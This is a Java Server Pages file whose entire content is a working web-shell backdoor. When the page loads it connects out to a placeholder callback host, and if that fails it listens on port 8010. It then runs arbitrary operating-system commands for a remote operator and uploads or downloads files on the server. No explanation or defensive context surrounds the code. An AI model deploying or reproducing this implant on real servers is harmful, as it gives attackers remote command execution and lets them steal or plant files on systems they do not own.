<%@ page import="java.io.*" %>
<%@ page import="java.net.*" %>
<% 

class javaNode {
  public Socket mySocket = null;
  public DataInputStream input = null;
  public DataOutputStream output = null;
  public String host = "CALLBACK_IP";
  public int port = CALLBACK_PORT;
  public int listenport = 8010;
  
  public void main() {
    String out = "";
    boolean ret;
    String outstring = null;
    byte[] outdata = null;
    ret=connect(host, port);
    
    if (ret != true) {
      ret = listen(listenport);
    }
    
    if (ret) {
      mainloop();
    }
  }
  
  public void sendresult(String stringdata) throws IOException {
    byte[] data;
    data = stringdata.getBytes();
    sendresult(data);
  }
  
  public void sendresult(byte[] data) throws IOException {
    this.output.writeInt(data.length);
    this.output.write(data, 0, data.length);
  }
  
  public boolean listen(int port) {
    try {
      ServerSocket myServerSocket = new ServerSocket(port);
      this.mySocket = myServerSocket.accept();
      this.input = new DataInputStream(mySocket.getInputStream());
      this.output = new DataOutputStream(mySocket.getOutputStream());
      return true;
    } catch (IOException e) {}
    
    return false;
  }
  
  public void mainloop() {
    byte[] data = null;
    byte[] outdata = null;
    int done = 0;
    int length;
    int comtype;
    String outstring;
  
    try {
      while (done != 1) {
        length = this.input.readInt();
        comtype = this.input.readInt();
        data = new byte[length];
        
        if (length > 0x00100000) {
          done = 1;
          continue;
        }
        
        this.input.readFully(data, 0, length);
        
        if (comtype == 1) {
          outstring=getcwd();
          sendresult(outstring);
        } 
        else if (comtype == 2) {
          cd(new String(data));
        } 
        else if (comtype == 3) {
          outstring = runcommand(new String(data));
          sendresult(outstring);
        } 
        else if (comtype == 4) {
          DataInputStream body = new DataInputStream(new ByteArrayInputStream(data));
          int filenameLength = body.readInt();
          byte[] filenameBytes = new byte[filenameLength];
          body.readFully(filenameBytes);
          String filename = new String(filenameBytes);
          byte[] filedata = new byte[length-4-filenameBytes.length];
          body.readFully(filedata);
          savefile(filename, filedata);
        } 
        else if (comtype == 5) {
          String filename = new String(data);
          byte[] filedata = getfiledata(filename);
          sendresult(filedata);
        }
      }
    }
    catch (IOException e) {
      done = 1;
    }
  }
  
  public String getcwd() {
    return System.getProperty("user.dir");
  }
  
  public void cd(String newdir) {
    System.setProperty("user.dir", newdir);
  }
  
  public byte[] getfiledata(String filename) throws IOException {
    FileInputStream input = new FileInputStream(filename);
    byte[] barray = new byte[input.available()];
    input.read(barray);
    return barray;
  }
  
  public void savefile(String filename, byte[] filedata)  throws IOException {
    FileOutputStream out = new FileOutputStream(filename);
    out.write(filedata);
    out.close();
  }
  
  public boolean connect(String host, int port) {
    try {
      this.mySocket = new Socket(host,port);
      this.input = new DataInputStream(this.mySocket.getInputStream());
      this.output = new DataOutputStream(this.mySocket.getOutputStream());
      return true;
    }
    catch (IOException e) {}
    
    return false;
  }
  
  public String runcommand(String command) {
    String str = null,  out_str = "";
    String prepend = "";
    String osname = new String(System.getProperty("os.name"));
    
    if (osname.indexOf("Windows") != -1) {
      prepend = "cmd.exe /c";
    }
    
    try {
      Process p=Runtime.getRuntime().exec(prepend + command);
      BufferedReader buf = new BufferedReader(new InputStreamReader(p.getInputStream()));
      
      while((str = buf.readLine()) != null) {
        out_str = out_str + str + "\n";
      }
    }
    catch(IOException e) {}
    
    return out_str;
  }
  
}

javaNode jstarter = new javaNode();
jstarter.main();

%>